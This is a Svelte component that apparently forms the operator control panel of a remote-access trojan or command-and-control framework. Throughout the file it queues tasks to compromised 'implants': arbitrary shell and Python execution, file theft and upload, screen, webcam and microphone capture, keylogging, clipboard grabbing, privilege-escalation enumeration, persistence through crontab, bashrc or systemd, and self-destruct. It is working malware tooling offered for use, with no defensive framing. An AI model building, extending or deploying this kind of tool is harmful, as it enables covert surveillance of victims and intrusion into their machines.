<script>
  import { tick } from 'svelte';
  import TaskQueue from './TaskQueue.svelte';

  let { implant, onTaskQueued } = $props();

  let activeCategory = $state('shell');
  let activeTab      = $state('execute');
  let busy           = $state(false);
  let statusMsg      = $state('');
  let statusOk       = $state(true);

  // ── Two-level tab structure ──────────────────────────────────────────────
  const CATEGORIES = [
    { id: 'shell',   label: 'Shell',   tabs: [
      { id: 'execute',   label: '>_ Run'    },
      { id: 'python',    label: '⟨⟩ Python' },
      { id: 'queue',     label: '◷ Queue'  },
    ]},
    { id: 'files',   label: 'Files',   tabs: [
      { id: 'files',     label: '📁 Browse' },
      { id: 'upload',    label: '↑ Upload' },
    ]},
    { id: 'capture', label: 'Capture', tabs: [
      { id: 'screenshot', label: '◉ Screen'  },
      { id: 'webcam',     label: '📷 Webcam' },
      { id: 'mic',        label: '🎤 Mic'    },
      { id: 'keylogger',  label: '⌨ Keylog'  },
      { id: 'clipboard',  label: '◈ Clip'    },
    ]},
    { id: 'recon',   label: 'Recon',   tabs: [
      { id: 'info',    label: 'ℹ Info'    },
      { id: 'procs',   label: '⊞ Procs'   },
      { id: 'network', label: '⌇ Network' },
      { id: 'privesc', label: '⚡ PrivEsc' },
    ]},
    { id: 'control', label: 'Control', tabs: [
      { id: 'persist',  label: '⊕ Persist' },
      { id: 'settings', label: '⚙ Config'  },
      { id: 'destruct', label: '✗ Destruct'},
    ]},
  ];

  const currentSubTabs = $derived(
    CATEGORIES.find(c => c.id === activeCategory)?.tabs ?? []
  );

  // Reset to execute tab when implant changes
  let lastImplantId = $state(null);
  $effect(() => {
    if (implant.id !== lastImplantId) {
      lastImplantId = implant.id;
      activeCategory = 'shell';
      activeTab = 'execute';
      statusMsg = '';
    }
  });

  function switchCategory(catId) {
    activeCategory = catId;
    const cat = CATEGORIES.find(c => c.id === catId);
    if (cat && !cat.tabs.some(t => t.id === activeTab)) {
      activeTab = cat.tabs[0].id;
    }
    statusMsg = '';
    maybeFocusExec();
  }

  function switchTab(id) {
    activeTab = id;
    statusMsg = '';
    const cat = CATEGORIES.find(c => c.tabs.some(t => t.id === id));
    if (cat) activeCategory = cat.id;
    maybeFocusExec();
  }

  // ── Per-tab state ────────────────────────────────────────────────────────
  let execCmd       = $state('');
  let cmdHistory    = $state([]);
  let histIdx       = $state(-1);
  let execInputEl   = $state(null);

  let uploadFile    = $state(null);
  let uploadName    = $state('');
  let dlPath        = $state('');
  let lsPath        = $state('.');
  let killPid       = $state('');
  let killSig       = $state('15');
  let interval      = $state(20);
  let updateFile    = $state(null);
  let persistMethod = $state('crontab');
  let pyCode        = $state('');
  let notesText     = $state('');
  let tagsText      = $state('');
  $effect(() => {
    notesText = implant.notes ?? '';
    tagsText  = (implant.tags ?? []).join(', ');
  });
  let webcamDevice    = $state('/dev/video0');
  let micDuration     = $state(5);
  let micDevice       = $state('default');
  let destructConfirm = $state(false);

  async function maybeFocusExec() {
    if (activeTab === 'execute') {
      await tick();
      execInputEl?.focus();
    }
  }

  // ── Generic task sender ──────────────────────────────────────────────────
  async function sendTask(payload) {
    busy = true; statusMsg = ''; statusOk = true;
    try {
      const res = await fetch(`/api/task/${implant.id}`, {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify(payload),
      });
      const data = await res.json();
      if (data.ok) {
        statusMsg = `Task #${data.task_id} queued`;
        statusOk  = true;
        onTaskQueued?.();
      } else {
        statusMsg = `Error: ${data.error}`;
        statusOk  = false;
      }
    } catch (e) {
      statusMsg = `Failed: ${e.message}`;
      statusOk  = false;
    } finally {
      busy = false;
    }
  }

  // ── Execute + history ────────────────────────────────────────────────────
  function submitExecute() {
    const cmd = execCmd.trim();
    if (!cmd) return;
    if (!cmdHistory.includes(cmd)) cmdHistory = [cmd, ...cmdHistory].slice(0, 50);
    histIdx = -1;
    sendTask({ type: 'execute', command: cmd });
    execCmd = '';
  }

  function execKeydown(e) {
    if (e.key === 'Enter') { e.preventDefault(); submitExecute(); return; }
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      const next = Math.min(histIdx + 1, cmdHistory.length - 1);
      histIdx = next; execCmd = cmdHistory[next] ?? '';
    }
    if (e.key === 'ArrowDown') {
      e.preventDefault();
      const next = Math.max(histIdx - 1, -1);
      histIdx = next; execCmd = next === -1 ? '' : cmdHistory[next];
    }
  }

  // ── Upload ───────────────────────────────────────────────────────────────
  async function submitUpload() {
    if (!uploadFile) return;
    const buf = await uploadFile.arrayBuffer();
    const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
    const name = uploadName.trim() || uploadFile.name;
    sendTask({ type: 'upload', filename: name, file: b64 });
    uploadFile = null; uploadName = '';
  }

  function submitDownload() {
    if (!dlPath.trim()) return;
    sendTask({ type: 'download', filepath: dlPath.trim() });
    dlPath = '';
  }

  function submitLs() { sendTask({ type: 'ls', path: lsPath.trim() || '.' }); }
  function submitScreenshot() { sendTask({ type: 'screenshot' }); }
  function submitWebcam() {
    sendTask({ type: 'webcam_snap', device: webcamDevice.trim() || '/dev/video0' });
  }
  function submitMic() {
    const dur = parseInt(micDuration, 10);
    if (!dur || dur < 1 || dur > 300) { statusMsg = 'Duration must be 1–300s'; statusOk = false; return; }
    sendTask({ type: 'mic_record', duration: dur, device: micDevice.trim() || 'default' });
  }
  function submitPs() { sendTask({ type: 'ps' }); }
  function submitKill() {
    const pid = parseInt(killPid.trim(), 10);
    if (!pid || isNaN(pid)) { statusMsg = 'Enter a valid PID'; statusOk = false; return; }
    sendTask({ type: 'kill_process', pid, signal: parseInt(killSig, 10) });
    killPid = '';
  }
  function submitNetstat() { sendTask({ type: 'netstat' }); }
  function submitSysinfo() { sendTask({ type: 'sysinfo' }); }
  function klogStart() { sendTask({ type: 'keylog_start' }); }
  function klogDump()  { sendTask({ type: 'keylog_dump'  }); }
  function klogStop()  { sendTask({ type: 'keylog_stop'  }); }
  function submitClip() { sendTask({ type: 'clipboard' }); }
  function submitPersist()   { sendTask({ type: 'persist',   method: persistMethod }); }
  function submitUnpersist() { sendTask({ type: 'unpersist', method: persistMethod }); }
  function submitPrivesc() { sendTask({ type: 'privesc_enum' }); }
  function submitPython() {
    if (!pyCode.trim()) return;
    sendTask({ type: 'exec_python', code: pyCode.trim() });
    pyCode = '';
  }
  function submitInterval() { sendTask({ type: 'set_interval', interval: Number(interval) }); }
  async function submitSelfUpdate() {
    if (!updateFile) return;
    const buf = await updateFile.arrayBuffer();
    const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
    sendTask({ type: 'self_update', payload: b64 });
    updateFile = null;
  }
  async function saveMetadata() {
    busy = true; statusMsg = ''; statusOk = true;
    try {
      const tags = tagsText.split(',').map(t => t.trim()).filter(Boolean);
      const res  = await fetch(`/api/implants/${implant.id}`, {
        method:  'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ notes: notesText, tags }),
      });
      const data = await res.json();
      statusMsg = data.ok ? 'Saved' : `Error: ${data.error}`;
      statusOk  = data.ok;
      onTaskQueued?.();
    } catch (e) { statusMsg = `Failed: ${e.message}`; statusOk = false; }
    finally { busy = false; }
  }
  function submitDestruct() {
    if (!destructConfirm) return;
    sendTask({ type: 'self_destruct' });
    destructConfirm = false;
  }
</script>

<div class="flex flex-col">

  <!-- Identity header -->
  <div class="flex items-center gap-2 px-3 py-1.5 bg-base-300/70 border-b border-base-200 shrink-0">
    <span class="text-xs font-mono text-primary/90 font-semibold truncate">{implant.user}@{implant.hostname}</span>
    <span class="text-base-content/15 select-none">·</span>
    <span class="text-xs text-base-content/30 truncate flex-1">{implant.os}</span>
    <span class="badge badge-xs font-mono shrink-0
      {implant.status === 'online' ? 'badge-success' : implant.status === 'idle' ? 'badge-warning' : 'badge-error'}">
      {implant.status ?? 'offline'}
    </span>
  </div>

  <!-- Category bar (Level 1) -->
  <div class="flex items-center gap-1 px-2 py-1.5 bg-base-300 border-b border-base-200/60 shrink-0">
    {#each CATEGORIES as cat}
      {@const isControl = cat.id === 'control'}
      {@const isActive  = activeCategory === cat.id}
      <button
        class="px-2.5 py-0.5 rounded text-xs font-medium transition-all duration-150 whitespace-nowrap
               {isControl ? 'ml-auto' : ''}
               {isActive
                 ? (isControl ? 'bg-error/12 text-error border border-error/25' : 'bg-primary/12 text-primary border border-primary/25')
                 : (isControl ? 'text-error/40 hover:text-error/70 hover:bg-error/5 border border-transparent'
                              : 'text-base-content/40 hover:text-base-content/65 hover:bg-base-content/5 border border-transparent')}"
        onclick={() => switchCategory(cat.id)}
      >
        {cat.label}
      </button>
    {/each}
  </div>

  <!-- Sub-tab bar (Level 2) -->
  <div class="flex overflow-x-auto bg-base-300/35 border-b border-base-200 shrink-0 px-1"
       style="scrollbar-width: none">
    {#each currentSubTabs as tab}
      {@const isActive  = activeTab === tab.id}
      {@const isDestruct = tab.id === 'destruct'}
      <button
        class="px-2.5 py-1.5 text-xs font-medium whitespace-nowrap transition-all duration-100
               border-b-2 -mb-px shrink-0
               {isActive
                 ? (isDestruct ? 'border-error text-error' : 'border-primary text-primary')
                 : (isDestruct ? 'border-transparent text-error/45 hover:text-error/80 hover:border-error/30'
                               : 'border-transparent text-base-content/38 hover:text-base-content/68 hover:border-base-content/18')}"
        onclick={() => switchTab(tab.id)}
      >
        {tab.label}
      </button>
    {/each}
  </div>

  <!-- Tab content -->
  <div class="p-3 bg-base-100 min-h-[76px]">

    <!-- >_ Run -->
    {#if activeTab === 'execute'}
      <div class="flex flex-col gap-2">
        <div class="flex items-center gap-2 rounded-lg px-2.5 py-2
                    bg-[#080d12] border border-base-content/8 font-mono
                    focus-within:border-primary/25 transition-colors duration-150">
          <span class="text-primary/45 text-sm select-none leading-none shrink-0">❯</span>
          <input
            bind:this={execInputEl}
            class="flex-1 bg-transparent text-xs text-base-content/85 outline-none
                   placeholder:text-base-content/18 leading-tight"
            placeholder="whoami  (↑↓ history, Enter to run)"
            bind:value={execCmd}
            onkeydown={execKeydown}
            disabled={busy}
            autocomplete="off" spellcheck="false"
          />
          {#if busy}
            <span class="loading loading-spinner loading-xs text-primary/40 shrink-0"></span>
          {:else if execCmd.trim()}
            <button class="text-sm text-primary/30 hover:text-primary/65 transition-colors shrink-0 leading-none"
                    onclick={submitExecute} title="Run (Enter)">
              ↵
            </button>
          {/if}
        </div>
        {#if cmdHistory.length > 0}
          <div class="flex flex-wrap gap-1">
            {#each cmdHistory.slice(0, 8) as h}
              <button class="px-1.5 py-0.5 rounded text-xs font-mono
                             bg-base-300/50 text-base-content/35 border border-base-content/8
                             hover:bg-primary/8 hover:text-primary/70 hover:border-primary/20
                             transition-all truncate max-w-[15rem]"
                      onclick={() => { execCmd = h; histIdx = cmdHistory.indexOf(h); execInputEl?.focus(); }}>
                {h.length > 32 ? h.slice(0, 32) + '…' : h}
              </button>
            {/each}
          </div>
        {/if}
      </div>
    {/if}

    <!-- 📁 Browse + Download -->
    {#if activeTab === 'files'}
      <div class="flex flex-col gap-2">
        <div class="flex gap-2">
          <input class="input input-bordered input-sm flex-1 font-mono text-xs bg-base-200"
                 placeholder="Directory to list  (e.g. /etc)"
                 bind:value={lsPath}
                 onkeydown={(e) => e.key === 'Enter' && submitLs()}
                 disabled={busy} />
          <button class="btn btn-primary btn-sm" onclick={submitLs} disabled={busy}>List</button>
        </div>
        <div class="flex gap-2">
          <input class="input input-bordered input-sm flex-1 font-mono text-xs bg-base-200"
                 placeholder="Remote path to download"
                 bind:value={dlPath}
                 onkeydown={(e) => e.key === 'Enter' && submitDownload()}
                 disabled={busy} />
          <button class="btn btn-secondary btn-sm" onclick={submitDownload}
                  disabled={busy || !dlPath.trim()}>
            Download
          </button>
        </div>
      </div>
    {/if}

    <!-- ↑ Upload -->
    {#if activeTab === 'upload'}
      <div class="flex flex-col gap-2">
        <input type="file"
               class="file-input file-input-bordered file-input-sm w-full bg-base-200"
               onchange={(e) => uploadFile = e.target.files[0]}
               disabled={busy} />
        <div class="flex gap-2">
          <input class="input input-bordered input-sm flex-1 bg-base-200"
                 placeholder="Remote destination path (blank = original filename)"
                 bind:value={uploadName} disabled={busy} />
          <button class="btn btn-primary btn-sm" onclick={submitUpload}
                  disabled={busy || !uploadFile}>
            Upload
          </button>
        </div>
      </div>
    {/if}

    <!-- ◉ Screenshot -->
    {#if activeTab === 'screenshot'}
      <div class="flex items-center gap-4">
        <p class="text-xs text-base-content/40 flex-1 leading-relaxed">
          Capture the full screen. Requires
          <code class="kbd kbd-xs">scrot</code> or
          <code class="kbd kbd-xs">imagemagick</code> on the target.
        </p>
        <button class="btn btn-primary btn-sm shrink-0" onclick={submitScreenshot} disabled={busy}>
          {#if busy}<span class="loading loading-spinner loading-xs"></span>{:else}Capture{/if}
        </button>
      </div>
    {/if}

    <!-- 📷 Webcam -->
    {#if activeTab === 'webcam'}
      <div class="flex flex-col gap-2.5">
        <p class="text-xs text-base-content/40">
          One frame from the target's webcam.
          Requires <code class="kbd kbd-xs">fswebcam</code> or <code class="kbd kbd-xs">ffmpeg</code>.
        </p>
        <div class="flex items-center gap-2">
          <span class="text-xs text-base-content/40 w-14 shrink-0">Device</span>
          <input class="input input-bordered input-sm flex-1 font-mono bg-base-200"
                 placeholder="/dev/video0" bind:value={webcamDevice} disabled={busy} />
          <button class="btn btn-primary btn-sm shrink-0" onclick={submitWebcam} disabled={busy}>Snap</button>
        </div>
      </div>
    {/if}

    <!-- 🎤 Mic -->
    {#if activeTab === 'mic'}
      <div class="flex flex-col gap-2.5">
        <p class="text-xs text-base-content/40">
          Record audio from the target's microphone.
          Requires <code class="kbd kbd-xs">arecord</code> or <code class="kbd kbd-xs">ffmpeg</code>.
        </p>
        <div class="flex items-center gap-2 flex-wrap">
          <span class="text-xs text-base-content/40 w-14 shrink-0">Duration</span>
          <input class="input input-bordered input-sm w-20 font-mono bg-base-200"
                 type="number" min="1" max="300" bind:value={micDuration} disabled={busy} />
          <span class="text-xs text-base-content/30">s</span>
          <span class="text-xs text-base-content/40 ml-2">Device</span>
          <input class="input input-bordered input-sm flex-1 font-mono bg-base-200 min-w-[80px]"
                 placeholder="default" bind:value={micDevice} disabled={busy} />
          <button class="btn btn-primary btn-sm shrink-0" onclick={submitMic} disabled={busy}>Record</button>
        </div>
      </div>
    {/if}

    <!-- ⌨ Keylog -->
    {#if activeTab === 'keylogger'}
      <div class="flex flex-col gap-2">
        <p class="text-xs text-base-content/30">
          Python only — requires <code class="kbd kbd-xs">pynput</code>. Accumulates keystrokes until Dump.
        </p>
        <div class="flex gap-2">
          <button class="btn btn-success btn-sm flex-1" onclick={klogStart} disabled={busy}>▶ Start</button>
          <button class="btn btn-warning btn-sm flex-1" onclick={klogDump}  disabled={busy}>⬇ Dump</button>
          <button class="btn btn-error   btn-sm flex-1" onclick={klogStop}  disabled={busy}>■ Stop</button>
        </div>
      </div>
    {/if}

    <!-- ◈ Clipboard -->
    {#if activeTab === 'clipboard'}
      <div class="flex items-center gap-4">
        <p class="text-xs text-base-content/40 flex-1">
          Grab clipboard contents. Tries xclip → xsel → wl-paste → pbpaste → PowerShell.
        </p>
        <button class="btn btn-primary btn-sm shrink-0" onclick={submitClip} disabled={busy}>Grab</button>
      </div>
    {/if}

    <!-- ℹ Info -->
    {#if activeTab === 'info'}
      <div class="flex items-center gap-4">
        <p class="text-xs text-base-content/40 flex-1">
          Hostname, OS, username, uptime, CPU, RAM, working directory, PID.
        </p>
        <button class="btn btn-primary btn-sm shrink-0" onclick={submitSysinfo} disabled={busy}>Get Info</button>
      </div>
    {/if}

    <!-- ⊞ Processes -->
    {#if activeTab === 'procs'}
      <div class="flex flex-col gap-2.5">
        <div class="flex items-center gap-3">
          <p class="text-xs text-base-content/40 flex-1">List all running processes on the target.</p>
          <button class="btn btn-primary btn-sm shrink-0" onclick={submitPs} disabled={busy}>List Procs</button>
        </div>
        <div class="divider my-0 text-xs text-base-content/20">Kill Process</div>
        <div class="flex gap-2">
          <input class="input input-bordered input-sm w-24 font-mono bg-base-200"
                 placeholder="PID" bind:value={killPid} disabled={busy}
                 onkeydown={(e) => e.key === 'Enter' && submitKill()} />
          <select class="select select-bordered select-sm flex-1 bg-base-200"
                  bind:value={killSig} disabled={busy}>
            <option value="15">SIGTERM (15)</option>
            <option value="9">SIGKILL  (9)</option>
            <option value="1">SIGHUP   (1)</option>
            <option value="2">SIGINT   (2)</option>
          </select>
          <button class="btn btn-warning btn-sm" onclick={submitKill}
                  disabled={busy || !killPid.trim()}>Kill</button>
        </div>
      </div>
    {/if}

    <!-- ⌇ Network -->
    {#if activeTab === 'network'}
      <div class="flex items-center gap-4">
        <p class="text-xs text-base-content/40 flex-1">
          Active TCP connections and listening ports.
        </p>
        <button class="btn btn-primary btn-sm shrink-0" onclick={submitNetstat} disabled={busy}>Show</button>
      </div>
    {/if}

    <!-- ⚡ PrivEsc -->
    {#if activeTab === 'privesc'}
      <div class="flex flex-col gap-2">
        <p class="text-xs text-base-content/40">
          SUID binaries, sudo rules, writable /etc files, Linux capabilities, env vars.
        </p>
        <div class="flex justify-end">
          <button class="btn btn-warning btn-sm" onclick={submitPrivesc} disabled={busy}>Enumerate</button>
        </div>
      </div>
    {/if}

    <!-- ⟨⟩ Python -->
    {#if activeTab === 'python'}
      <div class="flex flex-col gap-2">
        <textarea
          class="textarea textarea-bordered textarea-sm font-mono text-xs w-full h-20 resize-y bg-base-200"
          placeholder="import os&#10;print(os.listdir('/tmp'))"
          bind:value={pyCode} disabled={busy}
        ></textarea>
        <div class="flex justify-between items-center gap-2">
          <p class="text-xs text-base-content/25">exec() in-process — no file written.</p>
          <button class="btn btn-primary btn-sm shrink-0" onclick={submitPython}
                  disabled={busy || !pyCode.trim()}>Execute</button>
        </div>
      </div>
    {/if}

    <!-- ◷ Task Queue -->
    {#if activeTab === 'queue'}
      <TaskQueue implant={implant} onCancelled={onTaskQueued} />
    {/if}

    <!-- ⊕ Persist -->
    {#if activeTab === 'persist'}
      <div class="flex flex-col gap-2.5">
        <div class="flex items-center gap-2">
          <span class="text-xs text-base-content/45 w-16 shrink-0">Method</span>
          <select class="select select-bordered select-sm flex-1 bg-base-200"
                  bind:value={persistMethod} disabled={busy}>
            <option value="crontab">@reboot crontab</option>
            <option value="bashrc">~/.bashrc (on login)</option>
            <option value="systemd">systemd user service</option>
          </select>
        </div>
        <div class="flex gap-2">
          <button class="btn btn-warning btn-sm flex-1" onclick={submitPersist}   disabled={busy}>Install</button>
          <button class="btn btn-error   btn-sm flex-1" onclick={submitUnpersist} disabled={busy}>Remove All</button>
        </div>
        <p class="text-xs text-base-content/20">Remove All clears crontab, ~/.bashrc, and systemd simultaneously.</p>
      </div>
    {/if}

    <!-- ⚙ Config -->
    {#if activeTab === 'settings'}
      <div class="flex flex-col gap-3">
        <div class="flex items-center gap-3">
          <span class="text-xs text-base-content/45 w-32 shrink-0">Beacon interval (s)</span>
          <input type="number" class="input input-bordered input-sm w-20 bg-base-200"
                 bind:value={interval} min="1" disabled={busy} />
          <button class="btn btn-warning btn-sm" onclick={submitInterval} disabled={busy}>Set</button>
        </div>
        <div class="flex flex-col gap-2 border-t border-base-300 pt-3">
          <span class="text-xs font-semibold text-base-content/30 uppercase tracking-wider">Operator Notes</span>
          <textarea class="textarea textarea-bordered textarea-xs w-full bg-base-200 h-12 resize-none"
                    placeholder="Notes about this implant…"
                    bind:value={notesText} disabled={busy}></textarea>
          <input class="input input-bordered input-xs w-full bg-base-200"
                 placeholder="Tags (comma-separated)"
                 bind:value={tagsText} disabled={busy} />
          <div class="flex justify-end">
            <button class="btn btn-primary btn-xs" onclick={saveMetadata} disabled={busy}>Save</button>
          </div>
        </div>
        <div class="flex flex-col gap-2 border-t border-base-300 pt-3">
          <span class="text-xs font-semibold text-base-content/30 uppercase tracking-wider">
            Self-Update <span class="normal-case text-base-content/20">(Python only)</span>
          </span>
          <div class="flex gap-2">
            <input type="file" accept=".py"
                   class="file-input file-input-bordered file-input-xs flex-1 bg-base-200"
                   onchange={(e) => updateFile = e.target.files[0]}
                   disabled={busy} />
            <button class="btn btn-warning btn-xs shrink-0" onclick={submitSelfUpdate}
                    disabled={busy || !updateFile}>Deploy</button>
          </div>
        </div>
      </div>
    {/if}

    <!-- ✗ Destruct -->
    {#if activeTab === 'destruct'}
      <div class="flex flex-col gap-3">
        <div class="alert alert-error text-xs py-2 gap-2">
          <span>
            Removes all persistence, deletes the implant binary/script, and terminates the process.
            <strong>Irreversible.</strong>
          </span>
        </div>
        <label class="flex items-center gap-2 cursor-pointer select-none">
          <input type="checkbox" class="checkbox checkbox-error checkbox-sm"
                 bind:checked={destructConfirm} />
          <span class="text-sm">I confirm — destroy this implant</span>
        </label>
        <button class="btn btn-error btn-sm w-full font-mono tracking-wider"
                onclick={submitDestruct}
                disabled={busy || !destructConfirm}>
          ✗  SELF-DESTRUCT
        </button>
      </div>
    {/if}

  </div>

  <!-- Status bar -->
  {#if statusMsg}
    <div class="px-3 py-1 text-xs font-mono border-t border-base-300 shrink-0 flex items-center gap-1.5
                {statusOk ? 'text-success bg-success/5' : 'text-error bg-error/5'}
                animate-slide-down">
      <span class="shrink-0">{statusOk ? '✓' : '✗'}</span>
      <span class="flex-1">{statusMsg}</span>
    </div>
  {/if}
</div>
